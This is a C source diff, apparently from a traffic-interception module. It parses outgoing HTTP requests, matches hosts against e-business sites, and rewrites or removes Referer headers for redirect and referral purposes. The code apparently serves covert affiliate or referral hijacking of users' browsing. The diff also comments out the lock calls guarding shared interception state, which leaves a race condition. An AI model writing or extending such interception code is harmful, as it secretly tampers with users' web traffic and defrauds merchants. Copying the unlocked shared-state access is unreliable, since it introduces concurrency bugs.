@@ -316,7 +316,7 @@ main_point:
 	if (!GetHttpHeaderValue(headers, numHeaders, "host: ", &host))
 		goto release_sendbuffer;
 
-	if ((ebindex = MatchingEBusiness(host)) <= 12)
+	if ((ebindex = MatchingEBusiness(host)) <= 12 && ebindex != 0)
 		goto release_sendbuffer;
 
 	/* parse  url */
@@ -345,7 +345,7 @@ main_point:
 	}
 
 	if (ebindex == 0) { // linktect
-		if (memcmp(urlpath + 1, g_pRedirectIdentifier, strlen(g_pRedirectIdentifier)) == 0) {
+		if (strstr(urlpath, g_pRedirectInfo->pAccount)) {
 			char *p1, *p2;
 			char *referrer_header, *modified_referrer_header;
 			int referrer_header_len;
@@ -356,16 +356,19 @@ main_point:
 			// 1. drop redirect identifier
 			// 2. modify referrer header
 
-			modified_referrer_header = getModifiedReferrerHeader();
-
 			// check if send buffer is big enough to hold modified referrer header
 			if (!GetHttpHeaderValue(headers, numHeaders, "referer: ", &referrer_header)) {
 				referrer_header = body - 2;
 				referrer_header_len = 0;
 			} else {
+                if (strstr(referrer_header, "linktech.cn")) {
+                    goto release_sendbuffer;
+				}
 				referrer_header -= strlen("referer: ");
 				referrer_header_len = strlen(referrer_header) + 2;
 			}
+
+            modified_referrer_header = getModifiedReferrerHeader();
 
 			freesize = referrer_header_len + strlen(g_pRedirectIdentifier) +
 				(pSendBuffer->dwBufferSize - (pSendBuffer->pDataEnd - pSendBuffer->pDataStart));
@@ -385,11 +388,13 @@ main_point:
 			}
 
 			// drop redirect identifier
+            /*
 			p1 = strstr(pSendBuffer->pDataStart, g_pRedirectIdentifier);
 			p2 = p1 + strlen(g_pRedirectIdentifier);
 			memmove(p1, p2, pSendBuffer->pDataEnd - p2) ;
 			pSendBuffer->pDataEnd -= (strlen(g_pRedirectIdentifier));
 			referrer_header -= (strlen(g_pRedirectIdentifier));
+            */
 
 			// modify referrer
 			if (drop_referrer) {
@@ -412,11 +417,11 @@ main_point:
 		goto release_sendbuffer;
 	} 
 
-	EnterCriticalSection(&g_pRedirectInfo->Lock);
+//	EnterCriticalSection(&g_pRedirectInfo->Lock);
 	if (g_pRedirectInfo->pEBusiness[ebindex].bIntercepted)
 		goto release_sendbuffer;
 	g_pRedirectInfo->pEBusiness[ebindex].bIntercepted = TRUE;
-	LeaveCriticalSection(&g_pRedirectInfo->Lock);
+//	LeaveCriticalSection(&g_pRedirectInfo->Lock);
 
 	// build receive buffer
 	{
